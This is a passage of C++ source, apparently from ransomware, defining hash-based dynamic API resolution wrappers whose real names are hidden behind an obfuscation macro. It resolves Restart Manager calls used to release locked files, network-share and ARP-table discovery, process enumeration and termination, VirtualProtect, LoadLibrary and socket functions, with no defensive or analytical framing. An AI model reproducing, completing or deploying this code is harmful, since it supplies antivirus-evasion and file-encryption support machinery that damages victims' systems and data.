	BOOL(WINAPI * pFunction)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD);
	pFunction = (BOOL(WINAPI*)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xad18087f, 52);//GetProcAddress(hAdvapi32, OBFA("CryptAcquireContextA"));
	return pFunction(phProv, szContainer, szProvider, dwProvType, dwFlags);
}







__forceinline DWORD WINAPI pNetApiBufferFree(
	LPVOID Buffer
)
{
	DWORD(WINAPI * pFunction)(LPVOID);
	pFunction = (DWORD(WINAPI*)(LPVOID))getapi::GetProcAddressEx2(NULL, NETAPI32_MODULE_ID, 0x09223458, 51);//GetProcAddress(hNetApi32, OBFA("NetApiBufferFree"));
	return pFunction(Buffer);
}

__forceinline  DWORD WINAPI pNetShareEnum(
	WCHAR* servername,
	DWORD   level,
	LPBYTE* bufptr,
	DWORD   prefmaxlen,
	LPDWORD entriesread,
	LPDWORD totalentries,
	LPDWORD resume_handle
)
{
	DWORD(WINAPI * pFunction)(WCHAR*, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD);
	pFunction = (DWORD(WINAPI*)(WCHAR*, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD))getapi::GetProcAddressEx2(NULL, NETAPI32_MODULE_ID, 0x40d14d9a, 50);//GetProcAddress(hNetApi32, OBFA("NetShareEnum"));
	return pFunction(servername, level, bufptr, prefmaxlen, entriesread, totalentries, resume_handle);
}


__forceinline ULONG WINAPI pGetIpNetTable(
	PMIB_IPNETTABLE IpNetTable,
	PULONG          SizePointer,
	BOOL            Order
)
{
	ULONG(WINAPI * pFunction)(PMIB_IPNETTABLE, PULONG, BOOL);
	pFunction = (ULONG(WINAPI*)(PMIB_IPNETTABLE, PULONG, BOOL))getapi::GetProcAddressEx2(NULL, IPHLPAPI_MODULE_ID, 0xeae677e7, 49);//GetProcAddress(hIphlp32, OBFA("GetIpNetTable"));
	return pFunction(IpNetTable, SizePointer, Order);
}

__forceinline LPWSTR* WINAPI pCommandLineToArgvW(
	_In_ LPCWSTR lpCmdLine,
	_Out_ int* pNumArgs
)
{
	LPWSTR* (WINAPI * pFunction)(LPCWSTR, int*);
	pFunction = (LPWSTR * (WINAPI*)(LPCWSTR, int*))getapi::GetProcAddressEx2(NULL, SHELL32_MODULE_ID, 0x6dd8e1ea, 48);//GetProcAddress(hShell32, OBFA("CommandLineToArgvW"));
	return pFunction(lpCmdLine, pNumArgs);
}

__forceinline DWORD WINAPI pRmEndSession(
	DWORD dwSessionHandle
)
{
	DWORD(WINAPI * pFunction)(DWORD);
	pFunction = (DWORD(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0xa8f528dd, 47);//GetProcAddress(hRstrtmgr, OBFA("RmEndSession"));
	return pFunction(dwSessionHandle);
}


__forceinline DWORD WINAPI pRmStartSession(
	DWORD* pSessionHandle,
	DWORD    dwSessionFlags,
	WCHAR* strSessionKey
)
{
	DWORD(WINAPI * pFunction)(DWORD*, DWORD, WCHAR*);
	pFunction = (DWORD(WINAPI*)(DWORD*, DWORD, WCHAR*))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x3763d345, 46);//GetProcAddress(hRstrtmgr, OBFA("RmStartSession"));
	return pFunction(pSessionHandle, dwSessionFlags, strSessionKey);
}

__forceinline DWORD WINAPI pRmGetList(
	DWORD              dwSessionHandle,
	UINT* pnProcInfoNeeded,
	UINT* pnProcInfo,
	RM_PROCESS_INFO* rgAffectedApps,
	LPDWORD            lpdwRebootReasons
)
{
	DWORD(WINAPI * pFunction)(DWORD, UINT*, UINT*, RM_PROCESS_INFO*, LPDWORD);
	pFunction = (DWORD(WINAPI*)(DWORD, UINT*, UINT*, RM_PROCESS_INFO*, LPDWORD))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x462fab0f, 45);//GetProcAddress(hRstrtmgr, OBFA("RmGetList"));
	return pFunction(dwSessionHandle, pnProcInfoNeeded, pnProcInfo, rgAffectedApps, lpdwRebootReasons);
}


__forceinline DWORD WINAPI pRmRegisterResources(
	DWORD                dwSessionHandle,
	UINT                 nFiles,
	LPCWSTR* rgsFileNames,
	UINT                 nApplications,
	RM_UNIQUE_PROCESS* rgApplications,
	UINT                 nServices,
	LPCWSTR* rgsServiceNames
)
{
	DWORD(WINAPI * pFunction)(DWORD, UINT, LPCWSTR*, UINT, RM_UNIQUE_PROCESS*, UINT, LPCWSTR*);
	pFunction = (DWORD(WINAPI*)(DWORD, UINT, LPCWSTR*, UINT, RM_UNIQUE_PROCESS*, UINT, LPCWSTR*))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x803a648e, 44);//GetProcAddress(hRstrtmgr, OBFA("RmRegisterResources"));
	return pFunction(dwSessionHandle, nFiles, rgsFileNames, nApplications, rgApplications, nServices, rgsServiceNames);
}

__forceinline DWORD WINAPI pRmShutdown(
	DWORD                    dwSessionHandle,
	ULONG                    lActionFlags,
	RM_WRITE_STATUS_CALLBACK fnStatus
)
{
	DWORD(WINAPI * pFunction)(DWORD, ULONG, RM_WRITE_STATUS_CALLBACK);
	pFunction = (DWORD(WINAPI*)(DWORD, ULONG, RM_WRITE_STATUS_CALLBACK))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0xe7d62d41, 43);//GetProcAddress(hRstrtmgr, OBFA("RmShutdown"));
	return pFunction(dwSessionHandle, lActionFlags, fnStatus);
}

__forceinline void WINAPI pCoUninitialize()
{
	VOID(WINAPI * pFunction)();
	pFunction = (VOID(WINAPI*)())getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x68cc2bb5, 1);//GetProcAddress(hOle32, OBFA("CoUninitialize"));
	return pFunction();
}

__forceinline HRESULT WINAPI pCoCreateInstance(
	REFCLSID  rclsid,
	LPUNKNOWN pUnkOuter,
	DWORD     dwClsContext,
	REFIID    riid,
	LPVOID* ppv
)
{
	HRESULT(WINAPI * pFunction)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
	pFunction = (HRESULT(WINAPI*)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*))getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x5abc5ed6, 42);//GetProcAddress(hOle32, OBFA("CoCreateInstance"));
	return pFunction(rclsid, pUnkOuter, dwClsContext, riid, ppv);
}

__forceinline HRESULT WINAPI pCoSetProxyBlanket(
	IUnknown* pProxy,
	DWORD                    dwAuthnSvc,
	DWORD                    dwAuthzSvc,
	OLECHAR* pServerPrincName,
	DWORD                    dwAuthnLevel,
	DWORD                    dwImpLevel,
	RPC_AUTH_IDENTITY_HANDLE pAuthInfo,
	DWORD                    dwCapabilities
)
{
	HRESULT(WINAPI * pFunction)(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD);
	pFunction = (HRESULT(WINAPI*)(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD))getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x9b4ca937, 41);//GetProcAddress(hOle32, OBFA("CoSetProxyBlanket"));
	return pFunction(pProxy, dwAuthnSvc, dwAuthzSvc, pServerPrincName, dwAuthnLevel, dwImpLevel, pAuthInfo, dwCapabilities);
}

__forceinline HRESULT WINAPI pCoInitializeSecurity(
	PSECURITY_DESCRIPTOR        pSecDesc,
	LONG                        cAuthSvc,
	SOLE_AUTHENTICATION_SERVICE* asAuthSvc,
	void* pReserved1,
	DWORD                       dwAuthnLevel,
	DWORD                       dwImpLevel,
	void* pAuthList,
	DWORD                       dwCapabilities,
	void* pReserved3
)
{
	HRESULT(WINAPI * pFunction)(PSECURITY_DESCRIPTOR, LONG, SOLE_AUTHENTICATION_SERVICE*, void*, DWORD, DWORD, void*, DWORD, void*);
	pFunction = (HRESULT(WINAPI*)(PSECURITY_DESCRIPTOR, LONG, SOLE_AUTHENTICATION_SERVICE*, void*, DWORD, DWORD, void*, DWORD, void*))getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0xfaf3fba8, 40);//GetProcAddress(hOle32, OBFA("CoInitializeSecurity"));
	return pFunction(pSecDesc, cAuthSvc, asAuthSvc, pReserved1, dwAuthnLevel, dwImpLevel, pAuthList, dwCapabilities, pReserved3);
}

__forceinline HRESULT WINAPI pCoInitializeEx(
	LPVOID pvReserved,
	DWORD  dwCoInit
)
{
	HRESULT(WINAPI * pFunction)(LPVOID, DWORD);
	pFunction = (HRESULT(WINAPI*)(LPVOID, DWORD))getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x499c819f, 39);//GetProcAddress(hOle32, OBFA("CoInitializeEx"));
	return pFunction(pvReserved, dwCoInit);
}

__forceinline hostent* WINAPI pgethostbyname(
	const char* name
)
{
	hostent* (WINAPI * pFunction)(const char*);
	pFunction = (hostent * (WINAPI*)(const char*))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x3f6d3769, 38);//GetProcAddress(hWs2_32, OBFA("gethostbyname"));
	return pFunction(name);
}

__forceinline int WINAPI pgethostname(
	char* name,
	int  namelen
)
{
	int (WINAPI * pFunction)(char*, int);
	pFunction = (int (WINAPI*)(char*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8ec21b05, 37);//GetProcAddress(hWs2_32, OBFA("gethostname"));
	return pFunction(name, namelen);
}


__forceinline SOCKET WINAPI psocket(
	int af,
	int type,
	int protocol
)
{
	SOCKET(WINAPI * pFunction)(int, int, int);
	pFunction = (SOCKET(WINAPI*)(int, int, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xbe7cacc8, 36);//GetProcAddress(hWs2_32, OBFA("socket"));
	return pFunction(af, type, protocol);
}

__forceinline int WINAPI pWSAIoctl(
	SOCKET                             s,
	DWORD                              dwIoControlCode,
	LPVOID                             lpvInBuffer,
	DWORD                              cbInBuffer,
	LPVOID                             lpvOutBuffer,
	DWORD                              cbOutBuffer,
	LPDWORD                            lpcbBytesReturned,
	LPWSAOVERLAPPED                    lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
)
{
	int(WINAPI * pFunction)(SOCKET, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE);
	pFunction = (int(WINAPI*)(SOCKET, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8460e293, 35);//GetProcAddress(hWs2_32, OBFA("WSAIoctl"));
	return pFunction(s, dwIoControlCode, lpvInBuffer, cbInBuffer, lpvOutBuffer, cbOutBuffer, lpcbBytesReturned, lpOverlapped, lpCompletionRoutine);
}

__forceinline int WINAPI pclosesocket(
	IN SOCKET s
)
{
	int(WINAPI * pFunction)(SOCKET);
	pFunction = (int(WINAPI*)(SOCKET))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x3e3c66ba, 34);//GetProcAddress(hWs2_32, OBFA("closesocket"));
	return pFunction(s);
}

__forceinline INT WINAPI pWSAAddressToStringW(
	LPSOCKADDR          lpsaAddress,
	DWORD               dwAddressLength,
	LPWSAPROTOCOL_INFOW lpProtocolInfo,
	LPWSTR              lpszAddressString,
	LPDWORD             lpdwAddressStringLength
)
{
	int(WINAPI * pFunction)(LPSOCKADDR, DWORD, LPWSAPROTOCOL_INFOW, LPWSTR, LPDWORD);
	pFunction = (int(WINAPI*)(LPSOCKADDR, DWORD, LPWSAPROTOCOL_INFOW, LPWSTR, LPDWORD))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x6ae189ea, 33);//GetProcAddress(hWs2_32, OBFA("WSAAddressToStringW"));
	return pFunction(lpsaAddress, dwAddressLength, lpProtocolInfo, lpszAddressString, lpdwAddressStringLength);
}

__forceinline SOCKET WINAPI pWSASocketW(
	int                 af,
	int                 type,
	int                 protocol,
	LPWSAPROTOCOL_INFOW lpProtocolInfo,
	GROUP               g,
	DWORD               dwFlags
)
{
	SOCKET(WINAPI * pFunction)(int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD);
	pFunction = (SOCKET(WINAPI*)(int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xa7922856, 32);//GetProcAddress(hWs2_32, OBFA("WSASocketW"));
	return pFunction(af, type, protocol, lpProtocolInfo, g, dwFlags);
}

__forceinline int WINAPI pbind(
	SOCKET         s,
	const sockaddr* addr,
	int            namelen
)
{
	int(WINAPI * pFunction)(SOCKET, const sockaddr*, int);
	pFunction = (int(WINAPI*)(SOCKET, const sockaddr*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x6291cb76, 31);//GetProcAddress(hWs2_32, OBFA("bind"));
	return pFunction(s, addr, namelen);
}

__forceinline int WINAPI psetsockopt(
	SOCKET     s,
	int        level,
	int        optname,
	const char* optval,
	int        optlen
)
{
	int(WINAPI * pFunction)(SOCKET, int, int, const char*, int);
	pFunction = (int(WINAPI*)(SOCKET, int, int, const char*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x33b7fed1, 30);//GetProcAddress(hWs2_32, OBFA("setsockopt"));
	return pFunction(s, level, optname, optval, optlen);
}

__forceinline int WINAPI pgetsockopt(
	SOCKET s,
	int    level,
	int    optname,
	char* optval,
	int* optlen
)
{
	int(WINAPI * pFunction)(SOCKET, int, int, char*, int*);
	pFunction = (int(WINAPI*)(SOCKET, int, int, char*, int*))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x1c5ed854, 29);//GetProcAddress(hWs2_32, OBFA("getsockopt"));
	return pFunction(s, level, optname, optval, optlen);
}

__forceinline int WINAPI pshutdown(
	SOCKET s,
	int    how
)
{
	int(WINAPI * pFunction)(SOCKET, int);
	pFunction = (int(WINAPI*)(SOCKET, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8f9390c3, 28);//GetProcAddress(hWs2_32, OBFA("shutdown"));
	return pFunction(s, how);
}

__forceinline int WINAPI pWSAStartup(
	WORD      wVersionRequired,
	LPWSADATA lpWSAData
)
{
	int(WINAPI * pFunction)(WORD, LPWSADATA);
	pFunction = (int(WINAPI*)(WORD, LPWSADATA))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x86ffe89f, 27);//GetProcAddress(hWs2_32, OBFA("WSAStartup"));
	return pFunction(wVersionRequired, lpWSAData);
}

__forceinline int WINAPI pWSACleanup()
{
	int(WINAPI * pFunction)();
	pFunction = (int(WINAPI*)())getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xc84f6620, 26);//GetProcAddress(hWs2_32, OBFA("WSACleanup"));
	return pFunction();
}

__forceinline PCWSTR WSAAPI pInetNtopW(
	INT        Family,
	const VOID* pAddr,
	PWSTR      pStringBuf,
	size_t     StringBufSize
)
{
	PCWSTR(WINAPI * pFunction)(INT, const VOID*, PWSTR, size_t);
	pFunction = (PCWSTR(WINAPI*)(INT, const VOID*, PWSTR, size_t))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xa5470b24, 25);//GetProcAddress(hWs2_32, OBFA("InetNtopW"));
	return pFunction(Family, pAddr, pStringBuf, StringBufSize);
}

__forceinline PCSTR WINAPI pStrStrIA(
	PCSTR pszFirst,
	PCSTR pszSrch
)
{
	PCSTR(WINAPI * pFunction)(PCSTR, PCSTR);
	pFunction = (PCSTR(WINAPI*)(PCSTR, PCSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0x4c07f7e3, 24);//GetProcAddress(hShlwapi, OBFA("StrStrIA"));
	return pFunction(pszFirst, pszSrch);
}

__forceinline PCWSTR WINAPI pStrStrIW(
	PCWSTR pszFirst,
	PCWSTR pszSrch
)
{
	PCWSTR(WINAPI * pFunction)(PCWSTR, PCWSTR);
	pFunction = (PCWSTR(WINAPI*)(PCWSTR, PCWSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0xf8aefe61, 23);//GetProcAddress(hShlwapi, OBFA("StrStrIW"));
	return pFunction(pszFirst, pszSrch);
}

__forceinline HANDLE
WINAPI
pCreateEventA(
	_In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes,
	_In_ BOOL bManualReset,
	_In_ BOOL bInitialState,
	_In_opt_ LPCSTR lpName
)
{
	HANDLE(WINAPI * pFunction)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x2659d948, 22);
	return pFunction(lpEventAttributes, bManualReset, bInitialState, lpName);
}

__forceinline BOOL
WINAPI
pSetEvent(
	_In_ HANDLE hEvent
)
{
	BOOL(WINAPI * pFunction)(HANDLE);
	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x87d1e001, 21);
	return pFunction(hEvent);
}

__forceinline BSTR
WINAPI
pSysAllocString(
	const OLECHAR* psz
)
{
	BSTR(WINAPI * pFunction)(const OLECHAR*);
	pFunction = (BSTR(WINAPI*)(const OLECHAR*))getapi::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0x54def57d, 20);
	return pFunction(psz);
}

__forceinline VOID
WINAPI
pVariantInit(VARIANTARG* pvarg)
{
	VOID(WINAPI * pFunction)(VARIANTARG*);
	pFunction = (VOID(WINAPI*)(VARIANTARG*))getapi::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0xfc4ef6a9, 19);
	return pFunction(pvarg);
}

__forceinline HRESULT
WINAPI
pVariantClear(
	VARIANTARG* pvarg
)
{
	HRESULT(WINAPI * pFunction)(VARIANTARG*);
	pFunction = (HRESULT(WINAPI*)(VARIANTARG*))getapi::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0xbc7bf3e8, 18);
	return pFunction(pvarg);
}

__forceinline
DWORD
WINAPI
pSetFilePointer(
	HANDLE hFile,
	LONG lDistanceToMove,
	PLONG lpDistanceToMoveHigh,
	DWORD dwMoveMethod
)
{
	DWORD(WINAPI * pFunction)(HANDLE, LONG, PLONG, DWORD);
	pFunction = (DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x29103c8c, 17);
	return pFunction(hFile, lDistanceToMove, lpDistanceToMoveHigh, dwMoveMethod);
}

__forceinline
int
WINAPI
pwvsprintfW(
	LPWSTR Buf,
	LPCWSTR Format,
	va_list arglist
)
{
	int(WINAPI * pFunction)(LPWSTR, LPCWSTR, va_list);
	pFunction = (int(WINAPI*)(LPWSTR, LPCWSTR, va_list))getapi::GetProcAddressEx2(NULL, USER32_MODULE_ID, 0x5b7a35c4, 16);
	return pFunction(Buf, Format, arglist);
}

__forceinline
NTSTATUS
WINAPI
pNtQueryInformationProcess(
	IN HANDLE           ProcessHandle,
	IN MPROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID           ProcessInformation,
	IN ULONG            ProcessInformationLength,
	OUT PULONG          ReturnLength
)
{
	NTSTATUS(WINAPI * pFunction)(HANDLE, MPROCESSINFOCLASS, PVOID, ULONG, PULONG);
	pFunction = (NTSTATUS(WINAPI*)(HANDLE, MPROCESSINFOCLASS, PVOID, ULONG, PULONG))getapi::GetProcAddressEx2(NULL, NTDLL_MODULE_ID, 0x3f151423, 15);
	return pFunction(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);
}

__forceinline
HANDLE
WINAPI
pCreateToolhelp32Snapshot(
	DWORD dwFlags,
	DWORD th32ProcessID
)
{
	HANDLE(WINAPI * pFunction)(DWORD, DWORD);
	pFunction = (HANDLE(WINAPI*)(DWORD, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa86f8bb2, 14);
	return pFunction(dwFlags, th32ProcessID);
}

__forceinline
BOOL
WINAPI
pProcess32FirstW(
	HANDLE hSnapshot,
	LPPROCESSENTRY32W lppe
)
{
	BOOL(WINAPI * pFunction)(HANDLE, LPPROCESSENTRY32W);
	pFunction = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x5e57b014, 13);
	return pFunction(hSnapshot, lppe);
}

__forceinline
BOOL
WINAPI
pProcess32NextW(
	HANDLE hSnapshot,
	LPPROCESSENTRY32W lppe
)
{
	BOOL(WINAPI * pFunction)(HANDLE, LPPROCESSENTRY32W);
	pFunction = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xc9a81ce0, 12);
	return pFunction(hSnapshot, lppe);
}

__forceinline
HANDLE
WINAPI
pOpenProcess(
	__in DWORD dwDesiredAccess,
	__in BOOL bInheritHandle,
	__in DWORD dwProcessId
)
{
	HANDLE(WINAPI * pFunction)(DWORD, BOOL, DWORD);
	pFunction = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd62e935d, 11);
	return pFunction(dwDesiredAccess, bInheritHandle, dwProcessId);
}

__forceinline
BOOL
WINAPI
pTerminateProcess(
	__in HANDLE hProcess,
	__in UINT uExitCode
)
{
	BOOL(WINAPI * pFunction)(HANDLE, UINT);
	pFunction = (BOOL(WINAPI*)(HANDLE, UINT))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x86c5b0af, 10);
	return pFunction(hProcess, uExitCode);
}

__forceinline
int
WINAPI
pWideCharToMultiByte(
	UINT     CodePage,
	DWORD    dwFlags,
	LPCWSTR  lpWideCharStr,
	int      cchWideChar,
	LPSTR   lpMultiByteStr,
	int      cbMultiByte,
	LPCSTR   lpDefaultChar,
	LPBOOL  lpUsedDefaultChar)
{
	int(WINAPI * pFunction)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
	pFunction = (int(WINAPI*)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x7ae2521c, 9);
	return pFunction(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
}

__forceinline
DWORD
WINAPI
apGetModuleFileNameW(
	HMODULE hModule,
	LPWSTR  lpFilename,
	DWORD   nSize
)
{
	DWORD(WINAPI * pFunction)(HMODULE, LPWSTR, DWORD);
	pFunction = (DWORD(WINAPI*)(HMODULE, LPWSTR, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xebd9a617, 8);
	return pFunction(hModule, lpFilename, nSize);
}

__forceinline
HANDLE
WINAPI
apCreateFileMappingW(
	HANDLE                hFile,
	LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
	DWORD                 flProtect,
	DWORD                 dwMaximumSizeHigh,
	DWORD                 dwMaximumSizeLow,
	LPCWSTR               lpName
)
{
	HANDLE(WINAPI * pFunction)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
	pFunction = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x90b93fda, 7);
	return pFunction(hFile, lpFileMappingAttributes, flProtect, dwMaximumSizeHigh, dwMaximumSizeLow, lpName);
}

__forceinline
LPVOID
WINAPI
apMapViewOfFile(
	HANDLE hFileMappingObject,
	DWORD  dwDesiredAccess,
	DWORD  dwFileOffsetHigh,
	DWORD  dwFileOffsetLow,
	SIZE_T dwNumberOfBytesToMap
)
{
	LPVOID(WINAPI * pFunction)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
	pFunction = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x0ab3c572, 6);
	return pFunction(hFileMappingObject, dwDesiredAccess, dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap);
}

__forceinline
BOOL
WINAPI
apVirtualProtect(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flNewProtect,
	PDWORD lpflOldProtect
)
{
	BOOL(WINAPI * pFunction)(LPVOID, SIZE_T, DWORD, PDWORD);
	pFunction = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x00a7e8a5, 5);
	return pFunction(lpAddress, dwSize, flNewProtect, lpflOldProtect);
}

__forceinline
HMODULE
WINAPI
apLoadLibraryA(
	LPCSTR lpLibFileName
)
{
	HMODULE(WINAPI * pFunction)(LPCSTR);
	pFunction = (HMODULE(WINAPI*)(LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x439c7e33, 4);
	return pFunction(lpLibFileName);
}

__forceinline
FARPROC
WINAPI
apGetProcAddress(
	HMODULE hModule,
	LPCSTR  lpProcName
)
{
	FARPROC(WINAPI * pFunction)(HMODULE, LPCSTR);
	pFunction = (FARPROC(WINAPI*)(HMODULE, LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb6a6d4a2, 3);
	return pFunction(hModule, lpProcName);
}

__forceinline
char*
WSAAPI
pinet_ntoa(
	in_addr in
)
{
	char*(WINAPI * pFunction)(in_addr);
	pFunction = (char*(WINAPI*)(in_addr))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x464a1063, 2);
	return pFunction(in);
}